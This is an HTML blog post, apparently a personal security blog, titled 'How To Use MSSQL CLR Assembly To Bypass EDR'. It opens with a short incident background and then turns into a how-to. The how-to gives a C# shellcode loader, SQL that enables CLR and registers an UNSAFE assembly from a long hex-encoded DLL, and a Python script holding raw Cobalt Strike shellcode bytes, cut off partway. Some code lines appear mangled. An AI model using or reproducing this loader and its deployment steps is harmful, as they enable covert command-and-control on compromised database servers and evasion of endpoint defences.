@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="BackgroundA few days ago, I dealt with a blackmail incident involving an MSSQL database, which potentially evaded EDR detection. I intend to share the entire process. Upon analyzing the situation, I f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How To Use MSSQL CLR Assembly To Bypass EDR">
+<meta property="og:url" content="https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="BackgroundA few days ago, I dealt with a blackmail incident involving an MSSQL database, which potentially evaded EDR detection. I intend to share the entire process. Upon analyzing the situation, I f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-308.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-311.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-312.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-314.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-315.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-316.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-318.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-321.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-322.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-325.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-326.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-327.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-329.png">
+<meta property="article:published_time" content="2024-11-22T06:08:19.000Z">
+<meta property="article:modified_time" content="2024-11-22T08:31:39.622Z">
+<meta property="article:author" content="pyn3rd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pyn3rd.github.io/images/pasted-308.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>How To Use MSSQL CLR Assembly To Bypass EDR</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archives</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/11/03/CVE-2023-34050-Spring-AMQP-Deserialization-Remote-Code-Execution/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&text=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&is_video=false&description=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=How To Use MSSQL CLR Assembly To Bypass EDR&body=Check out this article: https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&name=How To Use MSSQL CLR Assembly To Bypass EDR&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&t=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-CLR"><span class="toc-number">2.</span> <span class="toc-text">What is CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-CLR-Assembly"><span class="toc-number">3.</span> <span class="toc-text">Compile CLR Assembly</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        How To Use MSSQL CLR Assembly To Bypass EDR
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">by pyn3rd</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-22T06:08:19.000Z" itemprop="datePublished">2024-11-22</time>
+        
+        (Updated: <time datetime="2024-11-22T08:31:39.622Z" itemprop="dateModified">2024-11-22</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>A few days ago, I dealt with a blackmail incident involving an MSSQL database, which potentially evaded EDR detection. I intend to share the entire process.</p>
+<p>Upon analyzing the situation, I found that the root cause was a weak password—essentially a type of dictionary password. The hacker was able to log in to the database using this weak password and injected his Cobalt Strike shellcode, gaining complete control over the MSSQL Server.</p>
+<h3 id="What-is-CLR"><a href="#What-is-CLR" class="headerlink" title="What is CLR"></a>What is CLR</h3><p>CLR, officially referred to by Microsoft as the Common Language Runtime, is a component of the .NET Framework that has been integrated into SQL Server since SQL Server 2005. This means that you can now use any .NET Framework language—including Microsoft Visual Basic .NET and Microsoft Visual C#—to write stored procedures, triggers, user-defined types, user-defined functions, user-defined aggregates, and table-valued functions.</p>
+<h3 id="Compile-CLR-Assembly"><a href="#Compile-CLR-Assembly" class="headerlink" title="Compile CLR Assembly"></a>Compile CLR Assembly</h3><p>Open Visual Studio Installer and click on <code>modify</code></p>
+<p><img src="/images/pasted-308.png" alt="upload successful"></p>
+<p>Select <code>Data Storage and Processing</code> tool</p>
+<p><img src="/images/pasted-311.png" alt="upload successful"></p>
+<p>Create new project<br><img src="/images/pasted-312.png" alt="upload successful"></p>
+<p>My experimental environment is MSSQL 2022, and both the relevant version and script creation have been selected correctly</p>
+<p><img src="/images/pasted-314.png" alt="upload successful"></p>
+<p><img src="/images/pasted-315.png" alt="upload successful"></p>
+<p><img src="/images/pasted-316.png" alt="upload successful"></p>
+<p>After completing the addition of the new project, most of current windows servers run on 64-bit platform, so here I provide the code for 64-bit platform</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [SqlProcedure]</span><br><span class="line">    public static void shellcode_loader(string sc)</span><br><span class="line">    &#123;</span><br><span class="line">// Place your code</span><br><span class="line">        SqlContext.Pipe.Send(shellcode_exec(sc));</span><br><span class="line">    &#125;</span><br><span class="line">    public static string shellcode_exec(string sc)</span><br><span class="line">    &#123;</span><br><span class="line">0x40);</span><br><span class="line">byte[] sa = new byte[1000];</span><br><span class="line">int shellcode_len = sc.Length / 2;</span><br><span class="line">for (int i = 0; i &lt; shellcode_len; i++)</span><br><span class="line">&#123;</span><br><span class="line">    string code = &quot;0x&quot; + sc.Substring(i * 2, 2);</span><br><span class="line">    int a = Convert.ToInt32(code, 16);</span><br><span class="line">    sa[i] = (byte)a;</span><br><span class="line">&#125;</span><br><span class="line">UInt64 shellcodeAddress = VirtualAlloc(0, (UInt64)sa.Length, 0x1000,</span><br><span class="line">Marshal.Copy(sa, 0, (IntPtr)(shellcodeAddress), sa.Length);</span><br><span class="line">CreateThread(0, 0, shellcodeAddress, 0, 0, 0);</span><br><span class="line">return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">    private static extern UInt64 VirtualAlloc(UInt64 lpAddress, UInt64 dwSize,</span><br><span class="line">UInt64 flAllocationType, UInt64 flProtect);</span><br><span class="line">    [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">    private static extern UInt32 CreateThread(UInt32 lpThreadAttributes, UInt32</span><br><span class="line">dwStackSize, UInt64 lpStartAddress, UInt32 lpParameter, UInt32 dwCreationFlags,</span><br><span class="line">UInt32 lpThreadId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Select Generate to generate solution</p>
+<p><img src="/images/pasted-318.png" alt="upload successful"></p>
+<p>We’ll get a SQL file in bin directory</p>
+<p><img src="/images/pasted-321.png" alt="upload successful"><br>We’ll have to abstract code fragment to create assembly</p>
+<p><img src="/images/pasted-322.png" alt="upload successful"></p>
+<p>Execute the following SQL statements</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;clr enabled&#x27;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">   GO</span><br><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br><span class="line">GO</span><br><span class="line">CREATE ASSEMBLY [MSSQL_ShellCodeLoader]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line"></span><br><span class="line">       FROM</span><br><span class="line">0x4D5A90000300000004000000FFFF0000B8000000000000004000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD215468</span><br><span class="line">69732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2</span><br><span class="line">400000000000000504500004C010300DBD669650000000000000000E00022200B013000000A000000</span><br><span class="line">060000000000005E28000000200000004000000000001000200000000200000400000000000000060</span><br><span class="line">000000000000000800000000200000000000003006085000010000010000000001000001000000000</span><br><span class="line">00001000000000000000000000000C2800004F00000000400000D8020000000000000000000000000</span><br><span class="line">00000000000006000000C000000D42600001C00000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000002000000800000000000000000000000820000</span><br><span class="line">04800000000000000000000002E746578740000006408000000200000000A00000002000000000000</span><br><span class="line">0000000000000000200000602E72737263000000D80200000040000000040000000C0000000000000</span><br><span class="line">000000000000000400000402E72656C6F6300000C0000000060000000020000001000000000000000</span><br><span class="line">000000000000004000004200000000000000000000000000000000402800000000000048000000020</span><br><span class="line">0050008210000CC050000010000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000004E00280500000A0228020000066F0</span><br><span class="line">600000A002A133006008E000000010000110020E80300008D090000010A026F0700000A185B0B160D</span><br><span class="line">2B2D0072010000700209185A186F0800000A280900000A130411041F10280A00000A130506091105D</span><br><span class="line">29C000917580D0907FE04130611062DC9166A068E696A20001000006A1F406A28030000060C061608</span><br><span class="line">280B00000A068E69280C00000A00161608161616280400000626720700007013072B0011072A22022</span><br><span class="line">80D00000A002A0042534A4201000100000000000C00000076342E302E33303331390000000005006C</span><br><span class="line">00000004020000237E0000700200009802000023537472696E677300000000080500000C000000235</span><br><span class="line">553001405000010000000234755494400000024050000A800000023426C6F62000000000000000200</span><br><span class="line">0001471502140900000000FA013300160000010000000D00000002000000050000000C0000000D000</span><br><span class="line">000040000000100000001000000020000000100000002000000000032010100000000000600B800E0</span><br><span class="line">010600D800E00106008E00AE010F0000020000060063024C010A00A20086010A00880286010A00750</span><br><span class="line">086010600F6004C0106000E014C01060080024C010600A7014C0106002A01C1010000000012000000</span><br><span class="line">000001000100010010000F02000015000100010050200000000096006901530001006420000000009</span><br><span class="line">60030005800020000000000800091203F005D00030000000000800091205A0065000700FE20000000</span><br><span class="line">008618A10106000D00000001004C00000001004C00000001004302000002000701000003007D00000</span><br><span class="line">004006A0200000100200200000200FB00000003004D02000004007A01000005003302000006004F00</span><br><span class="line">0900A10101001100A10106001900A1010A003100A101060039006C00100041006700150051001F012</span><br><span class="line">600510015012A0051005C02300059000A003600610074023C006900930241002900A1010600200023</span><br><span class="line">00A0002E000B006F002E00130078002E001B0097001A000100000107003F000100000109005A00010</span><br><span class="line">0048000000000000000000000000000000000530100000400000000000000000000004A0027000000</span><br><span class="line">00000400000000000000000000004A001B00000000000000006B65726E656C333200546F496E74333</span><br><span class="line">2003C4D6F64756C653E0053797374656D2E44617461006D73636F726C6962007368656C6C636F6465</span><br><span class="line">5F65786563005669727475616C416C6C6F63007363006C70546872656164496400437265617465546</span><br><span class="line">8726561640053656E64006765745F506970650053716C5069706500666C416C6C6F636174696F6E54</span><br><span class="line">7970650044656275676761626C654174747269627574650053716C50726F636564757265417474726</span><br><span class="line">96275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E</span><br><span class="line">74696D65436F6D7061746962696C6974794174747269627574650042797465006477537461636B536</span><br><span class="line">97A6500647753697A6500537472696E6700537562737472696E67006765745F4C656E677468004D61</span><br><span class="line">727368616C004D5353514C5F5368656C6C436F64654C6F616465722E646C6C0053797374656D004D5</span><br><span class="line">353514C5F5368656C6C436F64654C6F61646572007368656C6C636F64655F6C6F61646572006C7050</span><br><span class="line">6172616D65746572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F7</span><br><span class="line">200496E745074720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D</span><br><span class="line">652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C657</span><br><span class="line">2536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573</span><br><span class="line">006C70546872656164417474726962757465730064774372656174696F6E466C616773006C7041646</span><br><span class="line">472657373006C7053746172744164647265737300436F6E636174004F626A65637400666C50726F74</span><br><span class="line">656374006F705F4578706C6963697400436F6E766572740053716C436F6E7465787400436F7079000</span><br><span class="line">005300078000001000000001899F70588C10A4B9408847FF516E94500042001010803200001052001</span><br><span class="line">0111110400001221042001010E0B07081D05080B080E08020E032000080520020E08080500020E0E0</span><br><span class="line">E050002080E08040001180A080004011D0508180808B77A5C561934E089040001010E0400010E0E07</span><br><span class="line">00040B0B0B0B0B0900060909090B0909090801000800000000001E01000100540216577261704E6F6</span><br><span class="line"></span><br><span class="line">   E457863657074696F6E5468726F777301080100070100000000040100000000000000000000DBD669</span><br><span class="line">6500000000020000001C010000F0260000F008000052534453F44668E3C2CF6F49926FADC8983C8E9</span><br><span class="line">601000000453A5C6D7373716C2D70726F6A6563745C4461746162617365335C6F626A5C4465627567</span><br><span class="line">5C4D5353514C5F5368656C6C436F64654C6F616465722E70646200000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000003428000000000000000000004E280000002000</span><br><span class="line">00000000000000000000000000000000000000000040280000000000000000000000005F436F72446</span><br><span class="line">C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000010010000000180000800000000000000000000000000000010001000000300</span><br><span class="line">00080000000000000000000000000000001000000000048000000584000007C020000000000000000</span><br><span class="line">00007C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000</span><br><span class="line">000BD04EFFE00000100000000000000000000000000000000003F0000000000000004000000020000</span><br><span class="line">00000000000000000000000000440000000100560061007200460069006C00650049006E0066006F0</span><br><span class="line">0000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004</span><br><span class="line">DC010000010053007400720069006E006700460069006C00650049006E0066006F000000B80100000</span><br><span class="line">1003000300030003000300034006200300000002C0002000100460069006C00650044006500730063</span><br><span class="line">00720069007000740069006F006E000000000020000000300008000100460069006C0065005600650</span><br><span class="line">07200730069006F006E000000000030002E0030002E0030002E003000000054001A00010049006E00</span><br><span class="line">7400650072006E0061006C004E0061006D00650000004D005300530051004C005F005300680065006</span><br><span class="line">C006C0043006F00640065004C006F0061006400650072002E0064006C006C0000002800020001004C</span><br><span class="line">006500670061006C0043006F0070007900720069006700680074000000200000005C001A0001004F0</span><br><span class="line">072006900670069006E0061006C00460069006C0065006E0061006D00650000004D00530053005100</span><br><span class="line">4C005F005300680065006C006C0043006F00640065004C006F0061006400650072002E0064006C006</span><br><span class="line">C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030</span><br><span class="line">002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560</span><br><span class="line">065007200730069006F006E00000030002E0030002E0030002E003000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0000000000000002000000C0000006038000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br><span class="line">CREATE PROCEDURE [dbo].[shellcode_loader]</span><br><span class="line">@sc NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [MSSQL_ShellCodeLoader].[StoredProcedures].[shellcode_loader]</span><br></pre></td></tr></table></figure>
+
+<p>Create stored procedure<br>Turn on the CRL feature of MSSQL and then create stored procedure</p>
+<p><img src="/images/pasted-325.png" alt="upload successful"></p>
+<p>Generate shellcode using the C programming language in Cobalt Strike</p>
+<p><img src="/images/pasted-326.png" alt="upload successful"></p>
+<p>Convert the format of ShellCode with Python script </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">def hex_convert():</span><br><span class="line">   byte_sequence =</span><br><span class="line">b&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd</span><br><span class="line">2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7</span><br><span class="line">\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\</span><br><span class="line">x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x</span><br><span class="line">18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8</span><br><span class="line">b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01</span><br><span class="line">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\</span><br><span 